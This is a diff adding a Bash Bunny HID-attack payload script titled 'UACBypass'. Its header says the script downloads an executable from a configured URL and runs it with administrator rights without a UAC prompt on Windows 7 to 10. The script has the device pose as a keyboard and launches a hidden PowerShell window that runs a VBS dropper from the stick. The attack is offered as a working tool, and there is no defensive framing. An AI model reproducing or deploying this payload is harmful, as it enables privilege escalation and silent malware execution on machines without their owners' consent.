@@ -1,0 +1,37 @@
+# Title:         UACBypass
+# Author:        Skiddie
+# Version:       1.1
+# Target:        Windows
+#
+# Download and executes any binary executable with administrator privileges WITHOUT
+# prompting the user for administrator rights (aka UAC bypass/exploit)
+# Please define URL and SAVEFILENAME in the a.vbs script
+# Target does need internet connection
+# Works on Windows 7 - Windows 10
+# The UAC bypass was patched in Win10 V.1607, the file will still execute but with normal user privliges
+# However from what i am aware version 7,8 and 8.1 are still effected
+# Currently fastest download and execute for HID attacks to date. (with UAC bypass)
+
+#Define your bunny storage stick name
+DRIVER_LABEL='BashBunny'
+
+#RED means starting
+LED SETUP
+
+#Gets File locations
+GET SWITCH_POSITION
+
+#We are a keyboard
+ATTACKMODE HID STORAGE
+
+
+QUACK DELAY 500
+RUN WIN powershell -windowstyle hidden ".((gwmi win32_volume -f 'label=''$DRIVER_LABEL''').Name+'payloads\\$SWITCH_POSITION\a.vbs')"
+QUACK DELAY 1000
+
+# GREEN means finished
+LED G
+
+#If you would like to bash bunny to shutdown/exit/dismount from the target system after execution, you can uncomment the lines below
+#QUACK DELAY 4500
+#shutdown 0
